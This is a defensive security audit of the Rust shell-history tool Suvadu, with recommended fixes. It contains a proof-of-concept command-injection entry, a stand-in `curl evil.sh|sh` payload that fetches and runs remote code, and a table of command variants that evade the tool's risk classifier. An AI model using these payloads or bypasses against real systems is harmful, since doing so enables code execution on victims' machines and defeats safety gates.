# Security Audit — Suvadu (`AppachiTech/suvadu`)

- **Target:** [AppachiTech/suvadu](https://github.com/AppachiTech/suvadu) — "Shell history replacement with AI agent tracking and MCP server", Rust
- **Version audited:** `0.3.6` (commit `902ecfb`)
- **Date:** 2026-09-02
- **Scope:** Full source review of the Rust crate (`src/**`), generated shell hooks, agent/IDE integrations, MCP server, self-update path, install scripts, and CI/release workflows.
- **Method:** Manual source review plus a standalone reproduction of the primary finding using code copied verbatim from the target.

## Summary

Suvadu is a well-engineered, security-conscious project. It uses parameterised
SQL throughout, verifies self-update downloads with a compiled-in minisign
public key, restricts on-disk files to `0o600`/`0o700`, redacts secrets before
storage, and validates session IDs used in file paths. The dangerous-looking
areas (self-update, SQL building, path handling) are handled correctly.

However, there is **one high-severity command-injection vulnerability**: the
stats TUI feeds stored command history into an interactive shell (`$SHELL -ic`)
without sanitisation, so a crafted history entry executes arbitrary code the
next time the victim runs `suv stats`. Because history entries can be planted
via the documented `suv import` feature (and by AI-agent capture) with **no
redaction or sanitisation**, this is remotely exploitable in a realistic
threat model for a tool whose entire premise is "shared memory for your AI
agents".

| # | Severity | Issue | Location |
|---|----------|-------|----------|
| 1 | **High** | Command injection via `suv stats` shell-alias resolution | `src/stats_ui.rs` |
| 2 | Medium | `suv import` stores untrusted command text with no redaction/sanitisation (feeds #1) | `src/import_export.rs` |
| 3 | Medium | Risk-classifier (`assess_risk` / `agent report` gating) trivially bypassed | `src/risk.rs` |
| 4 | Low | OpenCode/pi prompt-cache filename not path-validated | `src/integrations.rs` (JS plugins) |
| 5 | Low | History/CLI output is not control-character sanitised (terminal-escape injection) | `src/commands/history.rs` |
| 6 | Info | Secret redaction is best-effort (documented) — several practical gaps | `src/redact.rs` |

---

## Finding 1 — Command injection via `suv stats` (High)

### Where

`src/stats_ui.rs`, function `detect_shell_aliases`:

```rust
fn detect_shell_aliases(programs: &[&str]) -> Option<HashMap<String, String>> {
    let shell = std::env::var("SHELL").unwrap_or_else(|_| "/bin/sh".to_string());

    // Build a single command: type prog1; type prog2; ...
    let type_cmds: Vec<String> = programs
        .iter()
        .map(|p| format!("type {p} 2>/dev/null"))   // <-- program token interpolated
        .collect();
    let script = type_cmds.join("; ");

    let mut cmd = std::process::Command::new(&shell);
    cmd.args(["-ic", &script]);                       // <-- run in an INTERACTIVE shell
    detach_from_controlling_terminal(&mut cmd);
    let output = cmd.output().ok()?;
    ...
}
```

`programs` is derived from stored command history by taking the first
whitespace-delimited token of each top command:

```rust
// src/stats_ui.rs:139 and :186
let programs: Vec<&str> = stats
    .top_commands
    .iter()
    .filter_map(|(cmd, _)| cmd.split_whitespace().next())
    .collect();
let alias_map = build_alias_map(repo, &programs);   // -> detect_shell_aliases
```

The token is interpolated directly into a shell script string and executed
with `$SHELL -ic`. Nothing quotes or validates it, so shell metacharacters in
the **first token of any stored command** are evaluated.

### Reachability

`StatsApp::new` (and `StatsApp::reload`) build `programs` and call
`build_alias_map` → `detect_shell_aliases` unconditionally. That path is
reached by `suv stats` — the interactive TUI, which is the **default** form of
the command (`src/commands/stats.rs:20` → `stats_ui::run_stats_ui`). It runs
again on every in-TUI reload. (`suv stats --text` / `--json` take a different
code path and are not affected.)

### Proof of concept

Using `detect_shell_aliases` copied verbatim from the target and fed a token
extracted exactly as `stats_ui` extracts it:

```
stored history command : $(id>/tmp/suvadu_pwned) --help
first token (program)  : $(id>/tmp/suvadu_pwned)
script run by `sh -ic`  : type $(id>/tmp/suvadu_pwned) 2>/dev/null
result                  : /tmp/suvadu_pwned  ->  uid=0(root) gid=0(root) groups=0(root)
```

The embedded `$(...)` executed. Any first-token payload works, e.g. a stored
command beginning with `` `curl evil.sh|sh` `` or `$(...)`.

### Impact

Arbitrary command execution in the victim's shell environment, triggered
merely by **viewing statistics** (`suv stats`). The attacker never needs the
victim to *run* the malicious command — it only needs to be **stored** in
history and surface among the top commands. Combined with Finding 2, a
malicious `suv import` file (or an AI agent coerced into running one crafted
command) is sufficient.

### Recommended fix

Do not build shell scripts from history data. Options, best first:

1. **Drop the interactive shell entirely.** Resolve aliases from the parsed
   output of a single `alias`/`type -a` dump (as `get_shell_aliases` in
   `suggest.rs` already does with a *fixed* argument), and match program names
   in Rust — never interpolate history tokens into a shell command line.
2. If per-program `type` is kept, pass each program as a **positional
   argument**, not string-spliced into the script:
   `sh -c 'for p in "$@"; do type "$p"; done' _ prog1 prog2 …`. Arguments in
   `"$@"` are not re-parsed as shell syntax.
3. At minimum, reject any program token that is not a plausible command name
   (e.g. `[A-Za-z0-9._/+-]+`, no shell metacharacters) before it reaches the
   shell.

Note `suggest.rs::get_shell_aliases` is safe (fixed `"alias"` argument); only
`stats_ui.rs::detect_shell_aliases` interpolates untrusted data.

---

## Finding 2 — `suv import` stores untrusted commands unsanitised (Medium)

### Where

`src/import_export.rs`, `import_jsonl_into_repo_opts` deserialises each JSONL
line straight into an `Entry` and inserts it:

```rust
let mut entry: Entry = match serde_json::from_str(trimmed) { ... };
...
repo.insert_entry(&entry)?;   // command text stored as-is
```

Unlike the live recording path (`src/commands/entry.rs::handle_add_inner`,
which applies `redact_secrets_with_extra` and exclusion filtering), the import
path applies **no redaction, no exclusion filtering, and no sanitisation** to
the `command` field.

### Impact

- **Primary:** provides the attacker-controlled input channel for Finding 1.
  `suv import` is documented as the supported cross-machine transfer mechanism
  (`SECURITY.md` → "Cross-machine transfer uses explicit `suv export` /
  `suv import`"), so importing a shared/downloaded history file is an expected
  user action. A single crafted entry whose command begins with `$(...)` yields
  code execution on the next `suv stats`.
- **Secondary:** secrets present in an imported history are stored in
  plaintext even when redaction is enabled, contradicting the "redaction
  enabled by default" posture for data entering the DB.

### Recommended fix

Run imported command text through the same redaction (when enabled) and, more
importantly, treat all stored command text as untrusted at every **consumer**
(see Finding 1's fix — the real defense is to never hand history text to a
shell). Consider documenting that `suv import` trusts the source file.

---

## Finding 3 — Risk classifier trivially bypassed (Medium)

### Where

`src/risk.rs` pattern definitions. The `assess_risk` MCP tool and
`suv agent report --fail-on <level>` (documented as usable for "local CI /
git-hook gating") depend on these regexes. Several are anchored or ordered so
that trivial, common variants slip through as **safe**:

| Command | Intended class | Actual result |
|---|---|---|
| `rm -fr /data` | Critical (recursive delete) | **not matched** (only `-rf`, not `-fr`) |
| `rm -Rf /data` | Critical | **not matched** (`-R` uppercase not covered) |
| `git push -f origin main` | Critical (force push) | **not matched** (only `--force`) |
| ` sudo rm -rf /` (leading space) | Medium (privilege) | **not matched** (`^sudo` anchor) |
| `env sudo …` / `command sudo …` | Medium | **not matched** |
| `curl http://x -o /tmp/a; sh /tmp/a` | High (script exec) | **not matched** (only the piped form) |

(Verified against the exact regexes in `critical_pattern_defs` /
`high_pattern_defs` / `medium_pattern_defs`.)

### Impact

The risk score is advisory, but it is explicitly offered as a **gate** for CI
and git hooks. An agent (or a human) can dodge the gate with a spelling
variant (`-fr` instead of `-rf`, `-f` instead of `--force`). Because the gate
gives a false sense of safety, dangerous commands pass review.

### Recommended fix

Normalise before matching (canonicalise combined short flags, treat `-R`/`-r`
equally, allow leading whitespace and common prefixes like `sudo`, `env`,
`command`, `nohup`, `time`). Match `rm` with any ordering of `-r`/`-R`/`-f`.
Add `-f`/`--force` alternation for `git push`. Document clearly that the
classifier is heuristic and must not be the only control.

---

## Finding 4 — OpenCode/pi prompt-cache filename not path-validated (Low)

### Where

The generated OpenCode plugin and pi extension (`src/integrations.rs`,
embedded JS/TS) build the prompt-cache filename directly from the runtime
session id:

```js
writeFileSync(join(dir, `opencode-${sessionID}.prompt`), truncated, { mode: 0o600 });
// and
const path = join(dir, `pi-${sessionId}.prompt`);
```

The Rust hooks that consume Claude/Cursor session ids validate them with
`is_valid_session_id` (alphanumeric/`-`/`_`, ≤256) before using them in a path;
the JS plugins do not apply an equivalent check to `sessionID`.

### Impact

Low in practice — these ids come from the agent runtime (typically UUIDs), not
a network attacker. But a `sessionID` containing `../` would let a write escape
the prompts directory. Defense-in-depth gap only.

### Recommended fix

Mirror `is_valid_session_id` in the JS/TS plugins (or `basename()` the id)
before composing the path.

---

## Finding 5 — CLI output not control-character sanitised (Low)

### Where

`src/commands/history.rs` prints stored command text directly to the terminal
(`println!("{}", …)`), as do several TUI render paths. Stored commands can
contain arbitrary bytes (including via `suv import`, Finding 2). The search
*input* path sanitises control characters (`src/search/input.rs`), but the
*output* path does not.

### Impact

A stored command containing raw ANSI/OSC escape sequences can manipulate the
terminal when history is printed (cursor moves, title changes, and on some
terminals clipboard writes or, historically, command injection via
misconfigured terminals). Classic "log/terminal escape injection". Low
severity given modern terminals, but relevant because history is explicitly
designed to be reviewed.

### Recommended fix

Strip or escape non-printable control characters (except `\t`) when writing
stored command text to a TTY, matching the input-side sanitisation.

---

## Finding 6 — Secret redaction gaps (Informational)

`src/redact.rs` is thoughtful and its limitations are honestly documented in
`SECURITY.md`. Noting practical gaps for completeness (all "best-effort" by
design, not bugs):

- Only the **first** matching token after a flag is redacted; space-separated
  multi-token secrets or unusual quoting can leak.
- `-p<pw>` redaction is scoped to `mysql`/`mysqldump`/`mariadb`; other tools'
  attached-password short flags (e.g. some `curl`, `psql` variants) are not
  covered.
- Env-assignment rule requires the sensitive word to be the final `_`-segment,
  so names like `MYTOKEN=` (no underscore separator, non-standard) or
  `X-Api-Key:`-style headers outside the covered patterns may pass.
- Redaction is applied on the live `add` path only, **not** on `import`
  (Finding 2).

These are acceptable for a best-effort local tool; the key improvement is
applying redaction on import as well.

---

## Things reviewed and found sound

- **SQL:** All queries use bound parameters (`?`) via `rusqlite`; the
  `FilterBuilder` interpolates only hardcoded column names and `?` placeholders
  (`src/repository/mod.rs`). `ORDER BY {order}` and the agent-exclusion `IN (…)`
  list are built only from hardcoded constants, never user input. No SQL
  injection found.
- **Self-update (`src/update.rs`):** Downloads over `--proto =https`, verifies a
  detached **minisign** signature against a compiled-in public key *before* the
  SHA-256 checksum, extracts with `tar --no-same-owner`, and canonicalises the
  extracted path to reject traversal outside the temp dir. A compromised
  download server cannot forge updates. Solid.
- **File permissions:** data dir `0o700`; DB, config, prompt cache, alias file,
  and backups `0o600`, set on the temp file before atomic rename (no TOCTOU
  window) — `src/util/file.rs`, `src/db.rs`.
- **MCP server:** Opens the DB **read-only** (`init_read_only`,
  `SQLITE_OPEN_READ_ONLY`), resource URIs are matched against a fixed set, and
  `session_id` in `suvadu://history/session/{id}` flows only into bound SQL. No
  write path or shell exec from MCP input.
- **Shell hook generation:** `bin_path` is single-quote escaped
  (`shell_quote_single` / `shell_escape`); custom-agent names and env vars are
  filtered to `[A-Za-z0-9_-]` via `is_safe_shell_identifier` before injection
  into the generated hook. Alias names are validated on manual `add`, and alias
  *commands* are single-quote escaped in `aliases.sh`.
- **`suv wrap`** runs `sh -c` on a command the user explicitly passed as argv —
  expected behaviour, not an injection.
- **CI/release:** Actions are pinned to commit SHAs; the minisign secret key is
  handled via GitHub Secrets and removed after signing.
- **`unsafe`:** The only `unsafe` blocks are `libc::setsid()` in `pre_exec`
  (correctly documented as async-signal-safe) — appropriate and minimal.

---

## Priority recommendations

1. **Fix Finding 1** — stop interpolating history tokens into `$SHELL -ic`.
   This is the one issue that yields arbitrary code execution and should be
   patched before anything else. (High)
2. **Apply redaction/sanitisation on `suv import`** and treat all stored
   command text as untrusted at every consumer. (Medium)
3. **Harden the risk classifier** or clearly de-emphasise it as a security
   gate. (Medium)
4. Address the low/informational items as defense-in-depth.
